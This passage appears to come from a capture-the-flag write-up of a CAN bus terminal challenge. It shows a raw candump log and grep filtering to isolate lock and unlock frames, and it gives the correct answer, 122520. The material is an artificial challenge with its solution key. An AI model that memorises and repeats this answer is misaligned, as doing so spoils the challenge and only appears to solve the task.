vcan0 244#000000019E (1608926678.162507) vcan0 244#000000016B (1608926678.177133) vcan0 244#0000000189 (1608926678.190641) vcan0 244#000000019D (1608926678.202156) vcan0 244#00000001AB (1608926678.214529) vcan0 244#000000013E (1608926678.226125) vcan0 244#0000000186 (1608926678.237962) vcan0 244#0000000158 (1608926678.251533) vcan0 244#0000000186 (1608926678.264476) vcan0 244#00000001E2 (1608926678.278343) vcan0 244#00000001DB (1608926678.291776) vcan0 244#00000001D2 (1608926678.304371) vcan0 244#00000001E8 (1608926678.316318) vcan0 244#0000000162 (1608926678.328870) vcan0 244#0000000114 (1608926678.341845) vcan0 244#0000000156 (1608926678.355350) vcan0 244#00000001D4 (1608926678.368556) vcan0 244#0000000146 (1608926678.380654) vcan0 244#0000000192 (1608926678.394633) vcan0 244#000000017F (1608926678.409006) vcan0 244#0000000140 (1608926678.423402) vcan0 244#00000001ED (1608926678.437327) vcan0 244#0000000147 (1608926678.451283) vcan0 244#00000001AE (1608926678.464014) vcan0 244#000000018E (1608926678.476738) vcan0 244#00000001D6 (1608926678.489315) vcan0 244#0000000199 (1608926678.502639) vcan0 244#0000000173 (1608926678.515574) vcan0 244#000000011E (1608926678.528405) vcan0 244#000000016A (1608926678.541244) vcan0 244#00000001E5 (1608926678.553858) vcan0 244#0000000159 (1608926678.566661) vcan0 244#0000000171 (1608926678.580414) vcan0 244#000000010A (1608926678.592863) vcan0 244#0000000193 (1608926678.604843) vcan0 244#0000000138 (1608926678.616971) vcan0 244#0000000166 (1608926678.629068) vcan0 244#0000000135 elf@ad71dd1d0e69:~$ So we're told that the candump is a log of the engine idling up and down. Additionally, there are 2 lock messages and 1 unlock message. Since the majority of the dump should be the idling messages, and since the majority of CAN IDs are 244 , we can remove the 244 messages, as they should represent one of the idling messages elf@ad71dd1d0e69:~$ grep -v \"^\\(.*\\)\\svcan0\\s244.*$\" candump.log (1608926660.970738) vcan0 188#00000000 (1608926661.474018) vcan0 188#00000000 (1608926661.978259) vcan0 188#00000000 (1608926662.478577) vcan0 188#00000000 (1608926662.977733) vcan0 188#00000000 (1608926663.483216) vcan0 188#00000000 (1608926663.989726) vcan0 188#00000000 (1608926664.491259) vcan0 188#00000000 (1608926664.626448) vcan0 19B#000000000000 (1608926664.996093) vcan0 188#00000000 (1608926665.499007) vcan0 188#00000000 (1608926666.009926) vcan0 188#00000000 (1608926666.512371) vcan0 188#00000000 (1608926667.013385) vcan0 188#00000000 (1608926667.520201) vcan0 188#00000000 (1608926668.022800) vcan0 188#00000000 (1608926668.530024) vcan0 188#00000000 (1608926669.036851) vcan0 188#00000000 (1608926669.544057) vcan0 188#00000000 (1608926670.046480) vcan0 188#00000000 (1608926670.550541) vcan0 188#00000000 (1608926671.055065) vcan0 188#00000000 (1608926671.122520) vcan0 19B#00000F000000 (1608926671.558329) vcan0 188#00000000 (1608926672.063221) vcan0 188#00000000 (1608926672.568871) vcan0 188#00000000 (1608926673.072611) vcan0 188#00000000 (1608926673.579853) vcan0 188#00000000 (1608926674.086447) vcan0 188#00000000 (1608926674.092148) vcan0 19B#000000000000 (1608926674.589954) vcan0 188#00000000 (1608926675.099853) vcan0 188#00000000 (1608926675.605010) vcan0 188#00000000 (1608926676.110132) vcan0 188#00000000 (1608926676.617537) vcan0 188#00000000 (1608926677.121567) vcan0 188#00000000 (1608926677.630561) vcan0 188#00000000 (1608926678.141434) vcan0 188#00000000 elf@ad71dd1d0e69:~$ Just to clean things up, let's remove the other idle message (the one with CAN ID 188 ) elf@ad71dd1d0e69:~$ grep -v \"^\\(.*\\)\\svcan0\\s\\(244\\|188\\).*$\" candump.log (1608926664.626448) vcan0 19B#000000000000 (1608926671.122520) vcan0 19B#00000F000000 (1608926674.092148) vcan0 19B#000000000000 elf@ad71dd1d0e69:~$ Since there are two lock messages and one unlock message, the unlock message should be 19B#00000F000000 elf@ad71dd1d0e69:~$ ./runtoanswer There are two LOCK codes and one UNLOCK code in the log. What is the decimal portion of the UNLOCK timestamp? (e.g., if the timestamp of the UNLOCK were 1608926672.391456, you would enter 391456. > 122520 Your answer: 122520 Checking.... Your answer is correct! elf@ad71dd1d0e69:~$ flag: 122520","title":"Terminal/CAN Bus Investigations"},{"location":"challenges/terminal-challenges/can-bus-investigation/#can-bus-investigation","text":"","title":"CAN Bus Investigation"},{"location":"challenges/terminal-challenges/can-bus-investigation/#shell","text":"MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM MMMMMMMMMMMMMMMMMMMMMMMMMMMMMWX00OkxxddcddxxkOO0XWMMMMMMMMMMMMMMMMMMMMMMMMMMMM MMMMMMMMMMMMMMMMMMMMMMMWXOxoc:c.;cccccc.ccccc:.:c:ldxOXMMMMMMMMMMMMMMMMMMMMMMM MMMMMMMMMMMMMMMMMMMMXkoc',ccccc:.:ccccc.ccccc.;cccc,'::cdOXMMMMMMMMMMMMMMMMMMM MMMMMMMMMMMMMMMMM0xc:cccc,':cccc::ccccccccccccccc:.;cccccc:lxXMMMMMMMMMMMMMMMM MMMMMMMMMMMMMMNkl,',:ccccc;;ccccccccccccccccccccc::cccccc:,',:lOWMMMMMMMMMMMMM MMMMMMMMMMMMNxccccc;';cccccccccccccccccccccccccccccccccc;':cccccckWMMMMMMMMMMM MMMMMMMMMMNdcccccc:..;cccccccccccccccccccccccccccccccccccccccccccc:kWMMMMMMMMM MMMMMMMMM0c,,,,:cccc;..;cccccccccccccccccccccccccccccccccccccc:,,,;:lKMMMMMMMM MMMMMMMWd:cccc;:cccccc;..,cccccccccccccccccccccccccccccccccccc;:cccccckMMMMMMM MMMMMMNlcccccccccccccccc:..,:ccccccccccccccccccccccccccccccccccccccccc:oWMMMMM MMMMMNc,,,,,:ccccccccccccc:..':cccccccccccccccccccccccccccccccccc:,,,,,;oWMMMM MMMMWoccccc::ccccccccccccccc:'.':cccccccccccccccccccccccccccccccc::ccccccxMMMM MMMMkccccccccccccccccccccccccc:'..:cccccccccccccccccccccccccccccccccccccc:0MMM MMMN::cccccccccccccccccccccccccc:'..:cccccccccccccccccccccccccccccccccccc:cWMM MMMk,,,,,:cccccccccccccccccccccccc:,..;ccccccccccccccccccccccccccccc:,,,,,;0MM MMMlccccccccccccccccccccccccccccccccc,.;cccccccccccccccccccccccccccccccccccdMM MMW:ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccclMM MMWOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0MM MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM Welcome to the CAN bus terminal challenge! In your home folder, there's a CAN bus capture from Santa's sleigh. Some of the data has been cleaned up, so don't worry - it isn't too noisy. What you will see is a record of the engine idling up and down. Also in the data are a LOCK signal, an UNLOCK signal, and one more LOCK. Can you find the UNLOCK? We'd like to encode another key mechanism. Find the decimal portion of the timestamp of the UNLOCK code in candump.log and submit it to ./runtoanswer! (e.g., if the timestamp is 123456.112233, please submit 112233) elf@ae8dbb83f303:~$","title":"Shell"},{"location":"challenges/terminal-challenges/can-bus-investigation/#solution","text":"Each message on the CAN bus has a CAN ID and a corresponding chunk of data. Messages that share the same functionality share a CAN ID and differ with the data. E.g. If lock/unlock share CAN ID 0x17A, a lock signal may send the message 0x17A:0000 0000, whereas an unlock signal may send the message 0x17A:0000 0001. Size of data vary based on message and manufacturer's dialect of CAN. We may be able to figure out the messages by looking at the CAN IDs and data chunks. Let's look at the CAN bus capture elf@ad71dd1d0e69:~$ ls -l total 516 -rwxr-xr-x 1 root root 56065 Dec 5 00:00 candump.log -rws--x--x 1 root root 469136 Dec 5 00:00 runtoanswer elf@ad71dd1d0e69:~$ cat candump.log (1608926660.800530) vcan0 244#0000000116 (1608926660.812774) vcan0 244#00000001D3 (1608926660.826327) vcan0 244#00000001A6 (1608926660.839338) vcan0 244#00000001A3 (1608926660.852786) vcan0 244#00000001B4 (1608926660.866754) vcan0 244#000000018E (1608926660.879825) vcan0 244#000000015F (1608926660.892934) vcan0 244#0000000103 (1608926660.904816) vcan0 244#0000000181 (1608926660.920799) vcan0 244#000000015F (1608926660.934338) vcan0 244#0000000173 (1608926660.946952) vcan0 244#0000000183 (1608926660.962926) vcan0 244#0000000149 (1608926660.970738) vcan0 188#00000000 (1608926660.977487) vcan0 244#00000001E0 (1608926660.989792) vcan0 244#00000001D6 (1608926661.002690) vcan0 244#0000000145 (1608926661.018189) vcan0 244#00000001E9 (1608926661.031261) vcan0 244#00000001F9 (1608926661.042719) vcan0 244#0000000185 (1608926661.053863) vcan0 244#00000001AB (1608926661.066551) vcan0 244#00000001E0 (1608926661.079120) vcan0 244#0000000157 (1608926661.092179) vcan0 244#00000001BD (1608926661.105503) vcan0 244#0000000188 (1608926661.120710) vcan0 244#0000000189 (1608926661.133553) vcan0 244#00000001C0 (1608926661.145725) vcan0 244#000000019E (1608926661.158666) vcan0 244#00000001E3 (1608926661.173070) vcan0 244#0000000123 (1608926661.184569) vcan0 244#00000001FC (1608926661.195901) vcan0 244#00000001C0 (1608926661.209364) vcan0 244#0000000155 (1608926661.220631) vcan0 244#00000001EB (1608926661.233510) vcan0 244#0000000182 (1608926661.245964) vcan0 244#0000000195 (1608926661.258201) vcan0 244#000000013B (1608926661.271293) vcan0 244#000000012B (1608926661.285172) vcan0 244#0000000191 (1608926661.297488) vcan0 244#000000015A (1608926661.309332) vcan0 244#0000000148 (1608926661.322653) vcan0 244#000000018E (1608926661.336724) vcan0 244#00000001EA (1608926661.348576) vcan0 244#00000001E7 (1608926661.361548) vcan0 244#0000000174 (1608926661.373583) vcan0 244#0000000167 (1608926661.385352) vcan0 244#0000000159 (1608926661.400643) vcan0 244#00000001D5 (1608926661.413712) vcan0 244#00000001ED (1608926661.426704) vcan0 244#000000016F (1608926661.440028) vcan0 244#00000001F7 (1608926661.454952) vcan0 244#00000001B4 (1608926661.467504) vcan0 244#00000001EC (1608926661.474018) vcan0 188#00000000 (1608926661.497162) vcan0 244#00000001EB (1608926661.509848) vcan0 244#000000010D (1608926661.522866) vcan0 244#0000000110 (1608926661.535661) vcan0 244#0000000110 (1608926661.548001) vcan0 244#000000016A (1608926661.563643) vcan0 244#00000001CA (1608926661.576051) vcan0 244#0000000110 (1608926661.589781) vcan0 244#00000001A9 (1608926661.602554) vcan0 244#00000001E2 (1608926661.614449) vcan0 244#00000001EC (1608926661.626380) vcan0 244#000000019B (1608926661.638457) vcan0 244#000000016B (1608926661.651923) vcan0 244#000000018A (1608926661.664353) vcan0 244#00000001CD (1608926661.676152) vcan0 244#00000001C2 (1608926661.688046) vcan0 244#0000000151 (1608926661.700350) vcan0 244#000000017A (1608926661.711897) vcan0 244#0000000139 (1608926661.723848) vcan0 244#0000000137 (1608926661.736140) vcan0 244#00000001A4 (1608926661.752191) vcan0 244#00000001C0 (1608926661.764946) vcan0 244#000000013A (1608926661.779049) vcan0 244#0000000133 (1608926661.793280) vcan0 244#0000000142 (1608926661.806615) vcan0 244#00000001B1 (1608926661.819373) vcan0 244#00000001A6 (1608926661.838732) vcan0 244#000000014B (1608926661.854134) vcan0 244#00000001BC (1608926661.869750) vcan0 244#00000001B9 (1608926661.887153) vcan0 244#000000019D (1608926661.899482) vcan0 244#00000001C4 (1608926661.911868) vcan0 244#0000000140 (1608926661.925341) vcan0 244#0000000146 (1608926661.938001) vcan0 244#00000001F0 (1608926661.950637) vcan0 244#000000016E (1608926661.963780) vcan0 244#00000001CD (1608926661.978084) vcan0 244#0000000157 (1608926661.978259) vcan0 188#00000000 (1608926661.992728) vcan0 244#000000019A (1608926662.005645) vcan0 244#0000000192 (1608926662.019680) vcan0 244#0000000155 (1608926662.049874) vcan0 244#0000000122 (1608926662.066645) vcan0 244#00000001CA (1608926662.077366) vcan0 244#00000001DC (1608926662.092455) vcan0 244#0000000148 (1608926662.107014) vcan0 244#00000001B3 (1608926662.120549) vcan0 244#000000013B (1608926662.135345) vcan0 244#0000000136 (1608926662.147581) vcan0 244#00000001C9 (1608926662.159970) vcan0 244#0000000191 (1608926662.300822) vcan0 244#000000018A (1608926662.314962) vcan0 244#000000018A (1608926662.327004) vcan0 244#00000001ED (1608926662.338878) vcan0 244#0000000161 (1608926662.351935) vcan0 244#00000001D9 (1608926662.363852) vcan0 244#000000014B (1608926662.375649) vcan0 244#00000001AF (1608926662.390980) vcan0 244#000000019B (1608926662.405242) vcan0 244#0000000134 (1608926662.420102) vcan0 244#0000000187 (1608926662.432350) vcan0 244#00000001F0 (1608926662.445774) vcan0 244#000000016E (1608926662.457836) vcan0 244#00000001E8 (1608926662.472519) vcan0 244#000000014D (1608926662.478577) vcan0 188#00000000 (1608926662.484790) vcan0 244#00000001D0 (1608926662.497708) vcan0 244#0000000175 (1608926662.511038) vcan0 244#0000000157 (1608926662.525266) vcan0 244#00000001B9 (1608926662.539122) vcan0 244#00000001E8 (1608926662.551746) vcan0 244#000000018E (1608926662.565696) vcan0 244#00000001E8 (1608926662.580454) vcan0 244#000000015A (1608926662.594779) vcan0 244#00000001CC (1608926662.606767) vcan0 244#00000001CE (1608926662.618856) vcan0 244#00000001D3 (1608926662.633226) vcan0 244#0000000130 (1608926662.646379) vcan0 244#000000011D (1608926662.659207) vcan0 244#000000012A (1608926662.672728) vcan0 244#0000000103 (1608926662.685353) vcan0 244#0000000102 (1608926662.698549) vcan0 244#0000000157 (1608926662.710804) vcan0 244#00000001AA (1608926662.724739) vcan0 244#00000001A8 (1608926662.736974) vcan0 244#0000000160 (1608926662.751613) vcan0 244#0000000127 (1608926662.764767) vcan0 244#000000011E (1608926662.776498) vcan0 244#0000000149 (1608926662.791623) vcan0 244#00000001F2 (1608926662.804769) vcan0 244#0000000155 (1608926662.818963) vcan0 244#000000011A (1608926662.833047) vcan0 244#0000000115 (1608926662.847319) vcan0 244#0000000162 (1608926662.862998) vcan0 244#0000000012 (1608926662.875880) vcan0 244#0000000024 (1608926662.888347) vcan0 244#0000000036 (1608926662.901322) vcan0 244#0000000048 (1608926662.914148) vcan0 244#000000005A (1608926662.925055) vcan0 244#000000006C (1608926662.938107) vcan0 244#000000007E (1608926662.950328) vcan0 244#0000000090 (1608926662.962629) vcan0 244#00000000A2 (1608926662.977599) vcan0 244#00000000B5 (1608926662.977733) vcan0 188#00000000 (1608926662.992760) vcan0 244#00000000C7 (1608926663.011800) vcan0 244#00000000D9 (1608926663.019913) vcan0 244#00000000EB (1608926663.036065) vcan0 244#00000000FD (1608926663.050314) vcan0 244#000000010F (1608926663.084956) vcan0 244#0000000121 (1608926663.095873) vcan0 244#0000000133 (1608926663.108499) vcan0 244#0000000145 (1608926663.121307) vcan0 244#0000000157 (1608926663.134884) vcan0 244#000000016A (1608926663.148361) vcan0 244#000000017C (1608926663.163176) vcan0 244#000000018E (1608926663.175988) vcan0 244#00000001A0 (1608926663.188715) vcan0 244#00000001B2 (1608926663.202484) vcan0 244#00000001C4 (1608926663.217094) vcan0 244#00000001D6 (1608926663.229824) vcan0 244#00000001E8 (1608926663.241816) vcan0 244#00000001FA (1608926663.253274) vcan0 244#000000020D (1608926663.266142) vcan0 244#000000021F (1608926663.279655) vcan0 244#0000000231 (1608926663.291745) vcan0 244#0000000243 (1608926663.306737) vcan0 244#0000000255 (1608926663.320910) vcan0 244#0000000267 (1608926663.335251) vcan0 244#0000000279 (1608926663.348101) vcan0 244#000000028B (1608926663.363482) vcan0 244#000000029D (1608926663.375607) vcan0 244#00000002AF (1608926663.389393) vcan0 244#00000002C2 (1608926663.402386) vcan0 244#00000002D4 (1608926663.414124) vcan0 244#00000002E6 (1608926663.427578) vcan0 244#00000002F8 (1608926663.441733) vcan0 244#000000030A (1608926663.456844) vcan0 244#000000031C (1608926663.469394) vcan0 244#000000032E (1608926663.482409) vcan0 244#0000000340 (1608926663.483216) vcan0 188#00000000 (1608926663.496846) vcan0 244#0000000352 (1608926663.508878) vcan0 244#0000000365 (1608926663.525275) vcan0 244#0000000377 (1608926663.539046) vcan0 244#0000000389 (1608926663.552461) vcan0 244#000000039B (1608926663.566030) vcan0 244#00000003AD (1608926663.578939) vcan0 244#00000003BF (1608926663.593612) vcan0 244#00000003D1 (1608926663.607026) vcan0 244#00000003E3 (1608926663.618775) vcan0 244#00000003F5 (1608926663.634185) vcan0 244#0000000407 (1608926663.647690) vcan0 244#000000041A (1608926663.660523) vcan0 244#000000042C (1608926663.675005) vcan0 244#000000043E (1608926663.688833) vcan0 244#0000000450 (1608926663.699880) vcan0 244#0000000462 (1608926663.712198) vcan0 244#0000000474 (1608926663.724508) vcan0 244#0000000486 (1608926663.736229) vcan0 244#0000000498 (1608926663.748694) vcan0 244#00000004AA (1608926663.762446) vcan0 244#00000004BD (1608926663.776172) vcan0 244#00000004CF (1608926663.791213) vcan0 244#00000004E1 (1608926663.804979) vcan0 244#00000004F3 (1608926663.821508) vcan0 244#0000000505 (1608926663.834550) vcan0 244#0000000517 (1608926663.848430) vcan0 244#0000000529 (1608926663.861471) vcan0 244#000000053B (1608926663.876565) vcan0 244#000000054D (1608926663.889607) vcan0 244#000000055F (1608926663.902160) vcan0 244#0000000572 (1608926663.916553) vcan0 244#0000000584 (1608926663.929340) vcan0 244#0000000596 (1608926663.942516) vcan0 244#00000005A8 (1608926663.955049) vcan0 244#00000005BA (1608926663.968577) vcan0 244#00000005CC (1608926663.981517) vcan0 244#00000005DE (1608926663.989726) vcan0 188#00000000 (1608926663.998660) vcan0 244#00000005F0 (1608926664.020416) vcan0 244#0000000602 (1608926664.036324) vcan0 244#0000000615 (1608926664.057593) vcan0 244#0000000627 (1608926664.078890) vcan0 244#0000000639 (1608926664.094480) vcan0 244#000000064B (1608926664.128465) vcan0 244#000000065D (1608926664.161405) vcan0 244#000000066F (1608926664.173912) vcan0 244#0000000681 (1608926664.186034) vcan0 244#0000000693 (1608926664.197777) vcan0 244#00000006A5 (1608926664.210633) vcan0 244#00000006B7 (1608926664.222200) vcan0 244#00000006CA (1608926664.235982) vcan0 244#00000006DC (1608926664.247990) vcan0 244#00000006EE (1608926664.264136) vcan0 244#0000000700 (1608926664.277038) vcan0 244#0000000712 (1608926664.290232) vcan0 244#0000000724 (1608926664.304080) vcan0 244#0000000736 (1608926664.319201) vcan0 244#0000000748 (1608926664.332318) vcan0 244#000000075A (1608926664.346533) vcan0 244#000000076D (1608926664.359862) vcan0 244#000000077F (1608926664.371866) vcan0 244#0000000791 (1608926664.384379) vcan0 244#00000007A3 (1608926664.397970) vcan0 244#00000007B5 (1608926664.409742) vcan0 244#00000007C7 (1608926664.421955) vcan0 244#00000007D9 (1608926664.433653) vcan0 244#00000007EB (1608926664.445598) vcan0 244#00000007FD (1608926664.457825) vcan0 244#000000080F (1608926664.469800) vcan0 244#0000000822 (1608926664.484453) vcan0 244#0000000834 (1608926664.491259) vcan0 188#00000000 (1608926664.498188) vcan0 244#0000000846 (1608926664.512142) vcan0 244#0000000858 (1608926664.523899) vcan0 244#000000086A (1608926664.538077) vcan0 244#000000087C (1608926664.552689) vcan0 244#000000088E (1608926664.568050) vcan0 244#00000008A0 (1608926664.582114) vcan0 244#00000008B2 (1608926664.595860) vcan0 244#00000008C5 (1608926664.608634) vcan0 244#00000008D7 (1608926664.623887) vcan0 244#00000008E9 (1608926664.626448) vcan0 19B#000000000000 (1608926664.635745) vcan0 244#00000008FB (1608926664.647559) vcan0 244#000000090D (1608926664.661009) vcan0 244#000000091F (1608926664.673421) vcan0 244#0000000931 (1608926664.686012) vcan0 244#0000000943 (1608926664.698832) vcan0 244#0000000955 (1608926664.712077) vcan0 244#0000000967 (1608926664.725623) vcan0 244#000000097A (1608926664.738804) vcan0 244#000000098C (1608926664.751359) vcan0 244#000000099E (1608926664.763545) vcan0 244#00000009B0 (1608926664.777448) vcan0 244#00000009C2 (1608926664.791887) vcan0 244#00000009D4 (1608926664.804779) vcan0 244#00000009E6 (1608926664.817468) vcan0 244#00000009F8 (1608926664.831084) vcan0 244#0000000A0A (1608926664.844710) vcan0 244#0000000A1D (1608926664.857410) vcan0 244#0000000A2F (1608926664.871109) vcan0 244#0000000A41 (1608926664.884847) vcan0 244#0000000A53 (1608926664.897191) vcan0 244#0000000A65 (1608926664.909212) vcan0 244#0000000A77 (1608926664.922841) vcan0 244#0000000A89 (1608926664.935527) vcan0 244#0000000A9B (1608926664.947798) vcan0 244#0000000AAD (1608926664.961673) vcan0 244#0000000ABF (1608926664.974470) vcan0 244#0000000AD2 (1608926664.989125) vcan0 244#0000000AE4 (1608926664.996093) vcan0 188#00000000 (1608926665.010315) vcan0 244#0000000AF6 (1608926665.025938) vcan0 244#0000000B08 (1608926665.042230) vcan0 244#0000000B1A (1608926665.050576) vcan0 244#0000000B2C (1608926665.064938) vcan0 244#0000000B3E (1608926665.079511) vcan0 244#0000000B50 (1608926665.092246) vcan0 244#0000000B62 (1608926665.106383) vcan0 244#0000000B75 (1608926665.119228) vcan0 244#0000000B87 (1608926665.132860) vcan0 244#0000000B99 (1608926665.147306) vcan0 244#0000000BAB (1608926665.161820) vcan0 244#0000000BBD (1608926665.175060) vcan0 244#0000000BCF (1608926665.189888) vcan0 244#0000000BE1 (1608926665.204797) vcan0 244#0000000BF3 (1608926665.219216) vcan0 244#0000000C05 (1608926665.232862) vcan0 244#0000000C17 (1608926665.246496) vcan0 244#0000000C2A (1608926665.259009) vcan0 244#0000000C3C (1608926665.271042) vcan0 244#0000000C4E (1608926665.285321) vcan0 244#0000000C60 (1608926665.299198) vcan0 244#0000000C72 (1608926665.312034) vcan0 244#0000000C84 (1608926665.325972) vcan0 244#0000000C96 (1608926665.339844) vcan0 244#0000000CA8 (1608926665.353596) vcan0 244#0000000CBA (1608926665.367323) vcan0 244#0000000CCD (1608926665.380032) vcan0 244#0000000CDF (1608926665.393884) vcan0 244#0000000CF1 (1608926665.407106) vcan0 244#0000000D03 (1608926665.421574) vcan0 244#0000000D15 (1608926665.434151) vcan0 244#0000000D27 (1608926665.446509) vcan0 244#0000000D39 (1608926665.459320) vcan0 244#0000000D4B (1608926665.472658) vcan0 244#0000000D5D (1608926665.485048) vcan0 244#0000000D6F (1608926665.498823) vcan0 244#0000000D82 (1608926665.499007) vcan0 188#00000000 (1608926665.511558) vcan0 244#0000000D94 (1608926665.523837) vcan0 244#0000000DA6 (1608926665.537455) vcan0 244#0000000DB8 (1608926665.551709) vcan0 244#0000000DCA (1608926665.563573) vcan0 244#0000000DDC (1608926665.576273) vcan0 244#0000000DEE (1608926665.589820) vcan0 244#0000000E00 (1608926665.602756) vcan0 244#0000000E12 (1608926665.617774) vcan0 244#0000000E24 (1608926665.633061) vcan0 244#0000000E37 (1608926665.646454) vcan0 244#0000000E49 (1608926665.659637) vcan0 244#0000000E5B (1608926665.674159) vcan0 244#0000000E6D (1608926665.687478) vcan0 244#0000000E7F (1608926665.699855) vcan0 244#0000000E91 (1608926665.713405) vcan0 244#0000000EA3 (1608926665.729998) vcan0 244#0000000EB5 (1608926665.742669) vcan0 244#0000000EC7 (1608926665.756448) vcan0 244#0000000EDA (1608926665.768203) vcan0 244#0000000EEC (1608926665.781218) vcan0 244#0000000EFE (1608926665.797186) vcan0 244#0000000F10 (1608926665.809704) vcan0 244#0000000F22 (1608926665.824233) vcan0 244#0000000F34 (1608926665.837554) vcan0 244#0000000F46 (1608926665.849683) vcan0 244#0000000F58 (1608926665.863475) vcan0 244#0000000F6A (1608926665.876267) vcan0 244#0000000F7C (1608926665.890399) vcan0 244#0000000F8F (1608926665.903908) vcan0 244#0000000FA1 (1608926665.917009) vcan0 244#0000000FB3 (1608926665.929606) vcan0 244#0000000FC5 (1608926665.942412) vcan0 244#0000000FD7 (1608926665.956432) vcan0 244#0000000FE9 (1608926665.970580) vcan0 244#0000000FFB (1608926665.983752) vcan0 244#000000100D (1608926666.000070) vcan0 244#000000101F (1608926666.009849) vcan0 244#0000001032 (1608926666.009926) vcan0 188#00000000 (1608926666.024054) vcan0 244#0000001044 (1608926666.039577) vcan0 244#0000001056 (1608926666.048316) vcan0 244#0000001068 (1608926666.061635) vcan0 244#000000107A (1608926666.075431) vcan0 244#000000108C (1608926666.088018) vcan0 244#000000109E (1608926666.100922) vcan0 244#00000010B0 (1608926666.114527) vcan0 244#00000010C2 (1608926666.126482) vcan0 244#00000010D4 (1608926666.140020) vcan0 244#00000010E7 (1608926666.153537) vcan0 244#00000010F9 (1608926666.167921) vcan0 244#000000110B (1608926666.181639) vcan0 244#000000111D (1608926666.195192) vcan0 244#000000112F (1608926666.206892) vcan0 244#0000001141 (1608926666.220209) vcan0 244#0000001153 (1608926666.232867) vcan0 244#0000001165 (1608926666.244841) vcan0 244#0000001177 (1608926666.260051) vcan0 244#000000118A (1608926666.277286) vcan0 244#000000119C (1608926666.290863) vcan0 244#00000011AE (1608926666.304918) vcan0 244#00000011C0 (1608926666.317809) vcan0 244#00000011D2 (1608926666.331887) vcan0 244#00000011E4 (1608926666.343966) vcan0 244#00000011F6 (1608926666.360417) vcan0 244#0000001208 (1608926666.381721) vcan0 244#000000121A (1608926666.393288) vcan0 244#000000122C (1608926666.406241) vcan0 244#000000123F (1608926666.419322) vcan0 244#0000001251 (1608926666.431681) vcan0 244#0000001263 (1608926666.451026) vcan0 244#0000001275 (1608926666.464794) vcan0 244#0000001287 (1608926666.478499) vcan0 244#0000001299 (1608926666.491986) vcan0 244#00000012AB (1608926666.506388) vcan0 244#00000012BD (1608926666.512371) vcan0 188#00000000 (1608926666.518466) vcan0 244#00000012CF (1608926666.530123) vcan0 244#00000012E2 (1608926666.542339) vcan0 244#00000012F4 (1608926666.556583) vcan0 244#0000001306 (1608926666.569917) vcan0 244#0000001318 (1608926666.581029) vcan0 244#000000132A (1608926666.594331) vcan0 244#000000133C (1608926666.607171) vcan0 244#000000134E (1608926666.623528) vcan0 244#0000001360 (1608926666.638805) vcan0 244#0000001372 (1608926666.651844) vcan0 244#0000001384 (1608926666.669536) vcan0 244#0000001397 (1608926666.682218) vcan0 244#00000013A9 (1608926666.695626) vcan0 244#00000013BB (1608926666.708564) vcan0 244#00000013CD (1608926666.721031) vcan0 244#00000013DF (1608926666.735641) vcan0 244#00000013F1 (1608926666.748140) vcan0 244#0000001403 (1608926666.760552) vcan0 244#0000001415 (1608926666.772413) vcan0 244#0000001427 (1608926666.784548) vcan0 244#000000143A (1608926666.795981) vcan0 244#000000144C (1608926666.807776) vcan0 244#000000145E (1608926666.820304) vcan0 244#0000001470 (1608926666.832901) vcan0 244#0000001482 (1608926666.850950) vcan0 244#0000001494 (1608926666.863172) vcan0 244#00000014A6 (1608926666.874937) vcan0 244#00000014B8 (1608926666.888715) vcan0 244#00000014CA (1608926666.900996) vcan0 244#00000014DC (1608926666.914338) vcan0 244#00000014EF (1608926666.925659) vcan0 244#0000001501 (1608926666.937843) vcan0 244#0000001513 (1608926666.950368) vcan0 244#0000001525 (1608926666.963823) vcan0 244#0000001537 (1608926666.978921) vcan0 244#0000001549 (1608926666.997692) vcan0 244#000000155B (1608926667.013303) vcan0 244#000000156D (1608926667.013385) vcan0 188#00000000 (1608926667.032531) vcan0 244#000000157F (1608926667.049236) vcan0 244#0000001592 (1608926667.065330) vcan0 244#00000015A4 (1608926667.081881) vcan0 244#00000015B6 (1608926667.098395) vcan0 244#00000015C8 (1608926667.112199) vcan0 244#00000015DA (1608926667.126197) vcan0 244#00000015EC (1608926667.140148) vcan0 244#00000015FE (1608926667.152769) vcan0 244#0000001610 (1608926667.165707) vcan0 244#0000001622 (1608926667.178629) vcan0 244#0000001634 (1608926667.191677) vcan0 244#0000001647 (1608926667.204217) vcan0 244#0000001659 (1608926667.217847) vcan0 244#000000166B (1608926667.231315) vcan0 244#000000167D (1608926667.245347) vcan0 244#000000168F (1608926667.259254) vcan0 244#00000016A1 (1608926667.271657) vcan0 244#00000016B3 (1608926667.284136) vcan0 244#00000016C5 (1608926667.297701) vcan0 244#00000016D7 (1608926667.311626) vcan0 244#00000016EA (1608926667.325463) vcan0 244#00000016FC (1608926667.337766) vcan0 244#000000170E (1608926667.350367) vcan0 244#0000001720 (1608926667.363496) vcan0 244#0000001732 (1608926667.376008) vcan0 244#0000001744 (1608926667.389773) vcan0 244#0000001756 (1608926667.402708) vcan0 244#0000001768 (1608926667.415924) vcan0 244#000000177A (1608926667.428075) vcan0 244#000000178C (1608926667.442296) vcan0 244#000000179F (1608926667.453613) vcan0 244#00000017B1 (1608926667.467184) vcan0 244#00000017C3 (1608926667.481775) vcan0 244#00000017D5 (1608926667.494631) vcan0 244#00000017E7 (1608926667.507234) vcan0 244#00000017F9 (1608926667.520158) vcan0 244#000000180B (1608926667.520201) vcan0 188#00000000 (1608926667.532004) vcan0 244#000000181D (1608926667.544029) vcan0 244#000000182F (1608926667.557966) vcan0 244#0000001841 (1608926667.571141) vcan0 244#0000001854 (1608926667.583068) vcan0 244#0000001866 (1608926667.595472) vcan0 244#0000001878 (1608926667.607968) vcan0 244#000000188A (1608926667.620688) vcan0 244#000000189C (1608926667.632910) vcan0 244#00000018AE (1608926667.646229) vcan0 244#00000018C0 (1608926667.658173) vcan0 244#00000018D2 (1608926667.671161) vcan0 244#00000018E4 (1608926667.686081) vcan0 244#00000018F7 (1608926667.699322) vcan0 244#0000001909 (1608926667.712494) vcan0 244#000000191B (1608926667.724046) vcan0 244#000000192D (1608926667.737315) vcan0 244#000000193F (1608926667.754557) vcan0 244#0000001951 (1608926667.772404) vcan0 244#0000001963 (1608926667.785119) vcan0 244#0000001975 (1608926667.799447) vcan0 244#0000001987 (1608926667.812428) vcan0 244#0000001999 (1608926667.824938) 